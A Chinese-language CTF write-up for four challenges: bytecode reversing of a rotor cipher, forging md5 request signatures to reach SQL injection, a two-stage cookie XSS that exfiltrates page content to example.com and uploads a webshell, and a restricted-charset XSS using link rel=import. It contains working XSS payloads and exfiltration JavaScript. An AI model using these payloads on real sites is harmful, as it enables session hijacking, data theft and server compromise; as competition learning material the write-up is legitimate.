## py

利用`marshal.loads`我们人肉扣出encrypt字节码，并根据常量发现了pip里有rotor模块，对着字节码进行了如下脑洞：
```
\x99\x01\x00    load consts   key_a="!@#$%^&*"
\x68\x01\x00    store

\x99\x02\x00    load  consts  key_b="abcdefgh"
\x68\x02\x00    store

\x99\x03\x00    load  consts  key_c="<>{}:""
\x68\x03\x00    store

\x61\x01\x00    load_f key_a
\x99\x04\x00    load consts 4
\x46 *          key_a * 4

\x99\x05\x00    load consts |
\x27 +          key_a * 4 + "|"

\x61\x02\x00    load_f key_b
\x61\x01\x00    load_f key_a
\x27 +

\x61\x03\x00    load_f key_c
\x27 +          key_b + key_a + key_c

\x99\x06\x00    load consts 2
\x46 *          (key_b + key_a + key_c) * 2
\x27 +          key_a * 4 + "|" + (key_b + key_a + key_c) * 2

\x99\x05\x00    load consts |
\x27 +          key_a * 4 + "|" + (key_b + key_a + key_c) * 2 + "|"

\x61\x02\x00    load_f key_b
\x99\x06\x00    load consts 2
\x46 *          key_b * 2
\x27 +          key_a * 4 + "|" + (key_b + key_a + key_c) * 2 + "|" + key_b * 2

\x99\x07\x00    load consts "EOF"
\x27 +          key_a * 4 + "|" + (key_b + key_a + key_c) * 2 + "|" + key_b * 2 + "EOF"

\x68\x04\x00    store secret = key_a * 4 + "|" + (key_b + key_a + key_c) * 2 + "|" + key_b * 2 + "EOF"
\x9b\x00\x00    IMPORT rotor
\x60\x01\x00    PUSH rotor.rotor

\x61\x04\x00    load_f secret
\x83\x01\x00    CALL # rotor.rotor(secret)

\x68\x05\x00    store rot = rotor.rotor(secret)
\x61\x05\x00    load_f rot
\x60\x02\x00    PUSH rot.encrypt

\x61\x00\x00    load_f data
\x83\x01\x00    CALL # rot.encrypt(data)

\x53            return
```

其实`\x27`很容易就猜出来是字符串拼接`+`，但是`\x46`我们一开始猜测是SLICE+1, SLICE+2 (即string[x:]和string[:x])折腾了好久，后来才脑洞出来字符串操作还有一个`*`....
于是就出来了，把secret扔进去rotor模块在decrypt一下就好。

## KoG

发现`Module.main`会对参数为纯数字的时候进行签名后，传给api.php，但有其他字符时不予签名。
仔细观察`functionn.js`，可以发现经过c++符号修饰的函数名，可以扔到`c++filt`里查看：
```
~$ c++filt _ZN5HASH16updateEPKhj
HASH1::update(unsigned char const*, unsigned int)
```
可知有个HASH1的类，仔细寻找代码里隐藏的常数可以知道是md5。


```javascript
function __ZN5HASH16updateEPKhj($this,$input,$length) {
 $this = $this|0;
 $input = $input|0;
 $length = $length|0;
```
然后在上面的`__ZN5HASH16updateEPKhj`update函数入口下断点，每次停下的时候在console里把`HEAP`里的`$input`指针指向的位置打出来看看，就知道传入了哪些字符串。一开始程序会传入"Start_here_"作为提示，但后来发现这个字符串是不需要的。事实上，把其他传进来的字符串拼接后，发现`functionn.js`做的就是return md5("d727d11f6d284a0d%s This_is_salt%s" % (payload, timestamp))，然后我们就可以自己对payload签名了，在payload中进行sql注入即可。


脚本如下：
```py
# __ZN5HASH16updateEPKhj
payload = sys.argv[1]
print payload
hash = hashlib.md5("d727d11f6d284a0d%s This_is_salt1489820887"%payload).hexdigest()
print requests.get('http://202.120.7.213:11181/api.php', params={'id':payload, 'hash':hash, 'time':'1489820887'}).text
```

## Complicated XSS

输入`admin.government.vip:8000`会跳转到`admin.government.vip:8000/login`进行登录，
登录后在`admin.government.vip:8000/`处，发现Cookie中的username字段会直接打到HTML页面上，这里可以进行二次XSS。
所以在原始payload中，要设置cookie如`username=<script src='http://example.com/xss.js'></script>;domain=.government.vip;path=/`来进行2次XSS，在`admin.government.vip:8000`下XSS就没有域限制。


原始payload脚本（第一次XSS）如下：
```py
def solve(cap):
    print 'cap: %s' % cap
    for i in xrange(1000000000):
        if hashlib.md5(str(i)).hexdigest()[:len(cap)] == cap:
            return str(i)

s = requests.session()
resp = s.get('http://government.vip/').text
resp = resp[resp.index(" === '")+len(" === '"):]
resp = resp[:6]
task = solve(resp)
data =  {"task": task, 'payload': '''
<script>
function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 *1000));
        var expires = "; expires=" + date.toGMTString();
    }
    else {
        var expires = "";
    }
    document.cookie = name + "=" + value + expires + ";domain=.government.vip;path=/";
}
function eraseCookie(name) {
    createCookie(name,"",-1);
}
eraseCookie("username");
// remember to ENCODE and REPLACE "BASE64_ENCODE_HERE(.)" in the payload below, or the end of script tag in the payload string makes trouble
document.cookie=atob(BASE64_ENCODE_HERE('''username=<script src='http://example.com/xss.js'></script>;domain=.government.vip;path=/'''));
document.write('<iframe src="http://admin.government.vip:8000/" id="i"></iframe>');
</script>
''', 'submit':'submit'}
print s.post('http://government.vip/run.php', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'}).text
```


`http://example.com/xss.js`要做的事情如下：
1. 恢复cookie中的username为admin
2. 因为`admin.government.vip:8000/`中`delete XMLHttpRequest`，我们可以从`<iframe src='/login' id='iij'></iframe>`中的contentWindow中把XMLHttpRequest恢复出来。
3. 使用恢复后的XMLHttpRequest，用恢复后的Cookie: username=admin把`<iframe src='/' id='ii'></iframe>`的页面内容回传。


回传后，发现admin的`admin.government.vip:8000/`页面不是flag而是一个让你上传webshell的表单，那么接下来我们只需要把第三步改成：
3. 使用恢复后的XMLHttpRequest，用恢复后的Cookie: username=admin，往`/upload`POST一个webshell文件（其实什么内容都可以），把response回传。


`http://example.com/xss.js`如下：
```javascript
//'username=admin;domain=.government.vip;path=/'
document.cookie=atob('dXNlcm5hbWU9YWRtaW47ZG9tYWluPS5nb3Zlcm5tZW50LnZpcDtwYXRoPS8=');
document.write("<iframe src='/login' id='iij'></iframe><iframe src='/' id='ii'></iframe>");

function send2(x, p) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
    };
    xhr.open('POST', 'http://example.com/record.php?'+p+'='+btoa(x), true);
    xhr.send(null);
}

setTimeout(function(){
    var arr = ["Function","eval","alert","XMLHttpRequest","Proxy","Image","postMessage"];
    for(var i in arr) {
        i = arr[i];
        window[i] = document.getElementById('iij').contentWindow[i];
    }

    function send(url, data) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState == 4)
                send2(xhr.responseText, 'resp');
        };
        var d = new FormData();
        d.append('file', new Blob([data]), 'agrnhte.php');
        xhr.send(d);
    }
    
    send("http://admin.government.vip:8000/upload", 'aaa');
}, 1000);

```


其实过程中遇到了玄学问题，比如它回传个400 BAD REQUEST什么就不谈了...


## simpleXSS

XSS payload只允许使用大小写字母数字加上`<^*~\-|_=+`这些特殊符号，那么大概只有两种方案：
1. 利用onload=A=B 可以作一句给A(通常是location)赋值B的简单js赋值操作
2. 利用某些奇怪的HTML标签特性


比赛时感觉方向1行不通，于是我走了方向2的思路。但方向1还真让某`LC↯BC`队(https://ctftime.org/writeup/5956)脑洞出来了个奇葩思路，只能佩服下RMB玩家...不对，应该是$12.95 Dollar玩家orz


我们（nao）想（dong）出来的payload有如下几个关键点：
1. Chrome会把域名中的`。`（全角句号）理解成"."
2. `<link rel=import`这种标签会把html import到当前页面里....N年前玩polymer的时候常用的一种标签...这里不能用script标签，因为script标签没有正常闭合时引用的js貌似不会被执行
3. `\\`会被Chrome理解成`//`，`\`也会理解成`/` （其实这里有个小插曲，我Win10上的Chrome会把`\\`理解成windows资源管理器里敲的那种`\\`也就是samba协议(或`file://`伪协议)...所以这种payload XSS Windows貌似是不行...?）， 因此`\\example。com\xssHtml`会变成`//example.com/xssHtml`


综上，payload:
```html
<link rel=import href=\\example。com\xssHtml other= 
```